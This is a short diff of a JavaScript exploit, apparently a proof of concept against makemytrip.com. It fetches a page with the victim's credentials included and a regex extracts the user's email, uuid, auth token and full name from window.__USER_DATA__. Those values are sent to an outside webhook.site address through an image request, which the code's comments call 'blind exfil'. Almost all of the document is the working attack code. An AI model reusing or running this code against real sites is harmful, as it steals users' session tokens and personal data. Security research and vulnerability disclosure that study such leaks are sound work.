@@ -1,11 +1,14 @@
 <script>
 fetch("https://www.makemytrip.com/apos-frontend/releases/Zhvy2kfRqOk7H0zojGVP4Zwwq2WCIpNr/default/public-bundle.css/", {
   method: "GET",
-  mode: "cors"
+  credentials: "include",
+  headers: {
+    "Origin": "https://bruno1777.github.io"
+  }
 })
 .then(res => res.text())
 .then(body => {
-  // extract the value of window.__USER_DATA__ using regex
+  // extract __USER_DATA__
   const match = body.match(/window\.__USER_DATA__\s*=\s*(\[\{.+?\}\]);/);
 
   if (match) {
@@ -17,7 +20,7 @@ fetch("https://www.makemytrip.com/apos-frontend/releases/Zhvy2kfRqOk7H0zojGVP4Zw
     const name = userData.userDetails.extendedUser.personalDetails.name;
     const fullName = `${name.firstName} ${name.lastName}`;
 
-    // blind exfil via GET to webhook
+    // blind exfil via GET image
     const img = new Image();
     img.src = `https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?email=${encodeURIComponent(email)}&uuid=${uuid}&auth=${auth}&name=${encodeURIComponent(fullName)}`;
   } else {
